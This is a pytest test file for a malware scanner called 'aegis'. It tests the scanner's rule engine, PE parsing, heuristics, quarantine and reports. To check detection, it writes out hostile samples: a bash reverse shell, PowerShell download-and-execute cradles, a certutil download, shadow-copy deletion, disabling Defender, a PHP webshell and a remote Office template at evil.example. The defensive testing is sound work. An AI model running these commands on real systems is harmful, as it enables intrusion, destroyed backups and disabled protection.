"""Tests for the core: rule engine, file analysis, file scanner, quarantine, engine, reports, CLI."""

import json
import struct
import zipfile
from pathlib import Path

import pytest

from aegis.core import fileanalysis as fa
from aegis.core.models import Finding, Remediation, ScanResult, Severity
from aegis.core.rules import RuleError, compile_rule


# ------------------------------------------------------------------ rule engine

def _rule(cond, strings=None, **kw):
    d = {"id": "T-1", "name": "test", "strings": strings or {"a": {"text": "alpha"}, "b": {"text": "beta"},
                                                              "c": {"regex": "gam+a"}}, "condition": cond}
    d.update(kw)
    return compile_rule(d)


@pytest.mark.parametrize("cond,data,expected", [
    ("a", b"xx alpha", True),
    ("a and b", b"alpha", False),
    ("a and b", b"alpha beta", True),
    ("a or c", b"gammmma", True),
    ("not a", b"beta", True),
    ("2 of them", b"alpha gamma", True),
    ("2 of them", b"alpha", False),
    ("any of (b,c)", b"gama", True),
    ("all of (a,b)", b"beta alpha", True),
    ("all", b"alpha beta gamma", True),
    ("any", b"nothing", False),
    ("(a or b) and not c", b"alpha gamma", False),
])
def test_conditions(cond, data, expected):
    assert (_rule(cond).match(data) is not None) is expected


def test_nocase_wide_hex():
    r = _rule("a and b and c", {"a": {"text": "Secret", "nocase": True}, "b": {"text": "wide", "wide": True},
                                "c": {"hex": "4D 5A ?? 00"}})
    assert r.match(b"SECRET " + "wide".encode("utf-16-le") + b"MZ\x90\x00") is not None
    assert r.match(b"SECRET wide MZ\x90\x01") is None  # hex wildcard requires 00 after '??'


def test_wide_also_matches_ascii_by_default():
    r = _rule("b", {"b": {"text": "wide", "wide": True}})
    assert r.match(b"wide") is not None
    assert r.match("wide".encode("utf-16-le")) is not None


@pytest.mark.parametrize("cond", ["a and", "foo", "3 of", "(a", "a b"])
def test_bad_conditions(cond):
    with pytest.raises(RuleError):
        _rule(cond)


def test_bundled_rules_compile(ctx):
    assert len(ctx.signatures.rules) >= 15
    ids = {r.id for r in ctx.signatures.rules}
    assert "AEG-TEST-EICAR" in ids


# ------------------------------------------------------------------ file analysis

def _minimal_pe(imports=("VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"), section=b".text") -> bytes:
    """Build a tiny but structurally valid PE32 with one section and an import table."""
    buf = bytearray(0x400)
    buf[0:2] = b"MZ"
    struct.pack_into("<I", buf, 0x3C, 0x80)
    buf[0x80:0x84] = b"PE\x00\x00"
    struct.pack_into("<HHIIIHH", buf, 0x84, 0x14C, 1, 1_600_000_000, 0, 0, 0xE0, 0x0102)
    opt = 0x98
    struct.pack_into("<H", buf, opt, 0x10B)
    struct.pack_into("<I", buf, opt + 16, 0x1000)
    struct.pack_into("<H", buf, opt + 68, 2)
    struct.pack_into("<I", buf, opt + 92, 16)  # NumberOfRvaAndSizes
    dd = opt + 96
    struct.pack_into("<II", buf, dd + 8, 0x1000, 40)  # import directory
    sec = opt + 0xE0
    buf[sec:sec + 8] = section.ljust(8, b"\x00")
    struct.pack_into("<IIII", buf, sec + 8, 0x1000, 0x1000, 0x200, 0x200)
    struct.pack_into("<I", buf, sec + 36, 0x60000020)
    body = bytearray(0x200)
    # descriptor @0x1000: OFT=0x1040, name=0x1030
    struct.pack_into("<IIIII", body, 0, 0x1040, 0, 0, 0x1030, 0x1040)
    body[0x30:0x3D] = b"kernel32.dll\x00"
    names_off = 0x80
    thunks = []
    for name in imports:
        thunks.append(0x1000 + names_off)
        body[names_off + 2: names_off + 2 + len(name) + 1] = name.encode() + b"\x00"
        names_off += 2 + len(name) + 1 + 1
    for i, t in enumerate(thunks):
        struct.pack_into("<I", body, 0x40 + i * 4, t)
    return bytes(buf[:0x200]) + bytes(body)


def test_pe_parser_imports_and_injection_indicator():
    pe = fa.parse_pe(_minimal_pe())
    assert not pe.error, pe.error
    assert pe.imports["kernel32.dll"] == ["VirtualAllocEx", "WriteProcessMemory", "CreateRemoteThread"]
    ids = {i.rule_id for i in fa.pe_indicators(pe, 1024)}
    assert "AEG-H-PE-INJECT" in ids
    assert "AEG-H-PE-UNSIGNED" in ids


def test_pe_parser_survives_garbage():
    assert fa.parse_pe(b"MZ" + b"\xff" * 10).error
    assert fa.parse_pe(b"MZ" + b"\x00" * 0x3A + b"\xff\xff\xff\x7f").error
    assert fa.parse_pe(b"not a pe").error


def test_packer_section():
    pe = fa.parse_pe(_minimal_pe(section=b"UPX1"))
    assert any(i.rule_id == "AEG-H-PE-PACKER" for i in fa.pe_indicators(pe, 1024))


@pytest.mark.parametrize("name,rid", [
    ("invoice.pdf.exe", "AEG-H-NAME-DOUBLEEXT"),
    ("photo\u202egpj.exe", "AEG-H-NAME-RTLO"),
    ("report.docx              .exe", "AEG-H-NAME-PADDING"),
])
def test_name_indicators(name, rid):
    assert rid in {i.rule_id for i in fa.name_indicators(Path(name), "pe")}


def test_benign_names_not_flagged():
    for n in ("setup.exe", "python-3.12.0-amd64.exe", "my.app.v2.exe", "driver.sys"):
        assert not fa.name_indicators(Path(n), "pe")
    assert not fa.name_indicators(Path("notes.txt"), "text")


def test_pe_disguised_as_pdf():
    assert "AEG-H-NAME-MISMATCH" in {i.rule_id for i in fa.name_indicators(Path("scan.pdf"), "pe")}


@pytest.mark.parametrize("text,rid", [
    (b"powershell -enc " + b"A" * 60, "AEG-H-SCR-ENCCMD"),
    (b"IEX (New-Object Net.WebClient).DownloadString('http://a/b')", "AEG-H-SCR-CRADLE"),
    (b"irm https://x.y/z | iex", "AEG-H-SCR-CRADLE2"),
    (b"vssadmin.exe Delete Shadows /all /quiet", "AEG-H-SCR-SHADOW"),
    (b"certutil -urlcache -split -f http://x/a.exe a.exe", "AEG-H-SCR-LOLBIN-DL"),
    (b"Set-MpPreference -DisableRealtimeMonitoring $true", "AEG-H-SCR-DEFENDER"),
    (b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "AEG-H-SCR-REVSHELL"),
    (b'{"url": "stratum+tcp://pool.example:3333"}', "AEG-H-SCR-MINER"),
    (b"<?php eval(base64_decode($_POST['x'])); ?>", "AEG-H-SCR-WEBSHELL"),
])
def test_script_indicators(text, rid):
    assert rid in {i.rule_id for i in fa.content_indicators(text, "script")}


def test_benign_script_not_flagged():
    benign = b"Get-ChildItem C:\\Logs | Where-Object Length -gt 1MB | Remove-Item\nWrite-Host 'done'\n"
    assert fa.content_indicators(benign, "script") == []


def test_office_macro_and_remote_template(tmp_path):
    doc = tmp_path / "a.docm"
    with zipfile.ZipFile(doc, "w") as z:
        z.writestr("word/vbaProject.bin", b"\x00Attribute AutoOpen\x00 CreateObject(\"WScript.Shell\")")
        z.writestr("word/_rels/settings.xml.rels",
                   '<Relationship Type=".../attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>')
    ids = {i.rule_id for i in fa.office_indicators(doc, doc.read_bytes())}
    assert {"AEG-H-DOC-MACRO", "AEG-H-DOC-AUTOEXEC", "AEG-H-DOC-REMOTE"} <= ids


def test_ransom_note(tmp_path):
    p = tmp_path / "HOW_TO_DECRYPT.txt"
    data = b"All your files have been encrypted! Buy bitcoin and use Tor Browser to visit our .onion site to decrypt."
    assert fa.ransom_note_indicators(p, data)
    assert not fa.ransom_note_indicators(tmp_path / "notes.txt", data)


def test_entropy_bounds():
    assert fa.entropy(b"") == 0
    assert fa.entropy(b"aaaa") == 0
    assert 7.9 < fa.entropy(bytes(range(256)) * 16) <= 8.0


# ------------------------------------------------------------------ file scanner

def test_scan_eicar_hash_rule_and_archive(ctx, tmp_path, eicar_bytes):
    from aegis.scanners.files import scan_file

    (tmp_path / "eicar.com").write_bytes(eicar_bytes)
    f = scan_file(ctx, tmp_path / "eicar.com")
    assert f and f[0].severity == Severity.CRITICAL and f[0].rule_id == "AEG-SIG-HASH"
    assert f[0].remediation.action == "quarantine_file"

    (tmp_path / "eicar.txt").write_bytes(eicar_bytes + b"\r\n")  # different hash -> content rule
    f = scan_file(ctx, tmp_path / "eicar.txt")
    assert any(x.rule_id == "AEG-TEST-EICAR" for x in f)

    with zipfile.ZipFile(tmp_path / "bundle.zip", "w") as z:
        z.writestr("docs/readme.txt", "hello")
        z.writestr("docs/eicar.com", eicar_bytes)
    f = scan_file(ctx, tmp_path / "bundle.zip")
    assert any("bundle.zip!docs/eicar.com" in x.location for x in f)


def test_clean_files_and_cache(ctx, tmp_path):
    from aegis.scanners.files import ScanCache, scan_file

    p = tmp_path / "hello.ps1"
    p.write_text("Write-Host 'hello world'")
    cache = ScanCache(tmp_path / "c.sqlite", "v1")
    assert scan_file(ctx, p, cache) == []
    assert scan_file(ctx, p, cache) == []
    assert ctx.stats.get("files_cached") == 1


def test_allowlisted_hash_is_ignored(ctx, tmp_path, eicar_bytes):
    from aegis.scanners.files import hash_file, scan_file

    p = tmp_path / "eicar.com"
    p.write_bytes(eicar_bytes)
    ctx.config.allowlist_hashes.append(hash_file(p)[0])
    assert scan_file(ctx, p) == []


def test_exclusions(ctx, tmp_path, eicar_bytes):
    from aegis.scanners.files import iter_files

    (tmp_path / "keep").mkdir()
    (tmp_path / "skip").mkdir()
    (tmp_path / "keep" / "a.exe").write_bytes(b"MZ")
    (tmp_path / "skip" / "b.exe").write_bytes(b"MZ")
    ctx.config.exclusions = [str(tmp_path / "skip"), "*.tmp"]
    (tmp_path / "keep" / "c.tmp").write_bytes(b"x")
    found = {p.name for p in iter_files([tmp_path], ctx)}
    assert found == {"a.exe"}


# ------------------------------------------------------------------ quarantine & remediation

def test_quarantine_roundtrip(tmp_path, eicar_bytes):
    from aegis.core.config import Config
    from aegis.core.quarantine import Quarantine

    q = Quarantine(Config.load())
    p = tmp_path / "bad.exe"
    payload = eicar_bytes * 50000  # > 1 chunk to exercise key offset handling
    p.write_bytes(payload)
    item = q.add(p, threat="test")
    assert not p.exists()
    blob = (q.dir / f"{item.id}.bin").read_bytes()
    assert blob != payload and eicar_bytes not in blob
    assert [i.id for i in q.list()] == [item.id]
    restored = q.restore(item.id[:6])
    assert restored.read_bytes() == payload
    assert q.list() == []


def test_remediation_quarantine(tmp_path):
    from aegis.core.config import Config
    from aegis.core.remediation import apply_remediation

    p = tmp_path / "x.bin"
    p.write_bytes(b"bad")
    f = Finding("T", "t", Severity.HIGH, "malware", remediation=Remediation("quarantine_file", {"path": str(p)}))
    ok, msg = apply_remediation(f, Config.load())
    assert ok and not p.exists()
    ok, msg = apply_remediation(Finding("T", "t", Severity.LOW, "x"), Config.load())
    assert not ok


# ------------------------------------------------------------------ models, scoring, reports

def test_result_roundtrip_and_score():
    r = ScanResult(profile="quick")
    r.add(Finding("A", "a", Severity.CRITICAL, "malware", location="x"))
    r.add(Finding("A", "a", Severity.HIGH, "malware", location="x"))  # duplicate
    r.add(Finding("B", "b", Severity.LOW, "system", location="y"))
    assert len(r.findings) == 2
    d = r.to_dict()
    assert d["score"] < 50 and d["grade"] in ("D", "F")
    r2 = ScanResult.from_dict(json.loads(r.to_json()))
    assert [f.fingerprint for f in r2.findings] == [f.fingerprint for f in r.findings]
    assert ScanResult().to_dict()["score"] == 100


def test_reports(tmp_path):
    from aegis.core.report import render_text, write_report

    r = ScanResult(profile="quick", host={"hostname": "h"})
    r.add(Finding("A", "<script>alert(1)</script>", Severity.HIGH, "malware", location="c:\\x",
                  evidence={"k": "v"}, mitre=["T1055.001"], remediation=Remediation("quarantine_file", {"path": "x"})))
    html = write_report(r, tmp_path / "r.html").read_text()
    assert "&lt;script&gt;alert(1)" in html and "<script>alert(1)" not in html
    assert "techniques/T1055/001" in html
    assert json.loads(write_report(r, tmp_path / "r.json").read_text())["findings"][0]["rule_id"] == "A"
    assert "severity" in write_report(r, tmp_path / "r.csv").read_text()
    assert "HIGH" in render_text(r)
    with pytest.raises(ValueError):
        write_report(r, tmp_path / "r.pdf")


# ------------------------------------------------------------------ engine & CLI

def test_engine_custom_files_scan(tmp_path, eicar_bytes):
    from aegis.core.engine import ScanEngine, last_scan

    (tmp_path / "e.com").write_bytes(eicar_bytes)
    eng = ScanEngine()
    eng.config.use_windows_defender_engine = False
    res = eng.scan("custom", ["files"], paths=[tmp_path])
    assert res.findings and res.findings[0].severity == Severity.CRITICAL
    assert last_scan(eng.config).findings[0].rule_id == res.findings[0].rule_id
    with pytest.raises(ValueError):
        eng.scan("custom", ["nope"])


def test_engine_allowlisted_fingerprint(tmp_path, eicar_bytes):
    from aegis.core.engine import ScanEngine

    (tmp_path / "e.com").write_bytes(eicar_bytes)
    eng = ScanEngine()
    first = eng.scan("custom", ["files"], paths=[tmp_path])
    eng.config.allowlist_fingerprints = [first.findings[0].fingerprint]
    eng.config.use_cache = False
    assert eng.scan("custom", ["files"], paths=[tmp_path]).findings == []


def test_cli_scan_fix_and_report(tmp_path, eicar_bytes, capsys):
    from aegis.cli import main

    p = tmp_path / "e.com"
    p.write_bytes(eicar_bytes)
    assert main(["scan", "--path", str(tmp_path), "-q"]) == 1
    out = capsys.readouterr().out
    assert "EICAR" in out
    assert main(["fix", "-y", "--min-severity", "critical"]) == 0
    assert not p.exists()
    assert main(["quarantine", "list"]) == 0
    assert "EICAR" in capsys.readouterr().out
    assert main(["report", str(tmp_path / "r.html")]) == 0
    assert (tmp_path / "r.html").exists()
    assert main(["scan", "--path", str(tmp_path), "-q", "--json"]) == 0
    assert main(["info", "--json"]) == 0
    assert main([]) == 0
